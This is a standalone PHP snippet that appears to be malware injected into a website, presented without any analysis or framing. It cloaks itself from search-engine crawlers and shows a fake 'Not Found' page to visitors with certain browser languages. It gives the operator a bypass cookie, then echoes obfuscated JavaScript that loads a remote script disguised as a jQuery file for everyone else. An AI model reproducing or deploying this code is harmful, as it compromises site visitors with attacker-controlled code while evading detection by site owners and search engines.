
$_smu1d = 'x099980109iee11be3c_25588';
if (checkJsPHPRun($_smu1d)) {
    $disableLang = ['zh', 'ru', 'be'];
    $langs      = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
    $arrLangs   = explode(';', $langs);
    if ($arrLangs) {
        $isDisableLang = false;
        foreach ($arrLangs as $itemLang) {
            if ($isDisableLang === false) {
                foreach ($disableLang as $iLang) {
                    if (strpos($itemLang, $iLang) !== false) {
                        $isDisableLang = true;
                        php403();
                        break;
                    }
                }
            }
        }
    }
$JS = <<<EOF
<script type="text/javascript">
['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]('\x72\x65\x74\x75\x72\x6e \x74\x68\x69\x73')()['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x77\x72\x69\x74\x65']((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,'60O115I99W114q105I112x116h32W116I121o112i101y61i34R116y101E120P116U47p106D97y118F97v115z99s114J105i112O116x34g32h115Q114Z99r61x34m104w116N116w112C115O58Z47L47k99V100c110N46a106D115S100K101J108o105G118B114c46e110S101f116z47Z103A104M47R122Y98g121E49Y49w50t50l51l51w47J67s68j78i47l106l113U117z101N114L121y45B109f105L110o45e117c105c46l106e115l34W62X60N47R115S99M114T105T112m116E62z10a60k110z111m115A99l114v105c112g116G62Q60w115E116A121W108N101G32y116g121d112k101W61u34J116b101E120j116C47w99x115T115Z34W62Q98E111r100F121i123n100D105h115R112O108W97Q121t58u110N111K110M101H59q125I60b47Q115A116f121w108c101Q62k60R47f110h111k115Z99z114z105f112l116C62'['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/)))
</script>
EOF;
echo $JS;
}
function checkJsPHPRun($_smu1d)
{
    $isRun  = true;
    $httpFrom = isset($_SERVER["HTTP_FROM"]) ? $_SERVER["HTTP_FROM"] : '';
    if (stripos($httpFrom, '(at)googlebot.com') !== false) {
        $isRun = false;
    }
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
    if ($isRun && $userAgent) {
        $spiders = array(
            'Googlebot',
            'Yahoo! Slurp',
            'msnbot'
        );
        foreach ($spiders as $spider) {
            $spider = strtolower($spider);
            if (strpos($userAgent, $spider) !== false) {
                $isRun = false;
                break;
            }
        }
    }
    if ($isRun) {
        $getSmu1d       = isset($_GET['_smu1d'])    ? trim($_GET['_smu1d'])   : '';
        if ($getSmu1d == $_smu1d) {
            setcookie("_smu1d", $_smu1d);
            $isRun  = false;
        } else {
            $strCustomKey   = isset($_COOKIE['_smu1d']) ? trim($_COOKIE['_smu1d']) : '';
            if ($strCustomKey) {
                if ($_smu1d == $strCustomKey) {
                    $isRun  = false;
                }
            }
        }
    }


    return $isRun;
}

function php403()
{
    header("HTTP/1.1 403 Forbidden");
    echo <<<EOF
    <!DOCTYPE html>
    <html lang="en">
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="initial-scale=1, minimum-scale=1, width=device-width">
            <title>Error 404 Not Found</title>
        </head>
        <body>
            <H1>Not Found</H1>
        </body>
    </html>
EOF;
    die;
}
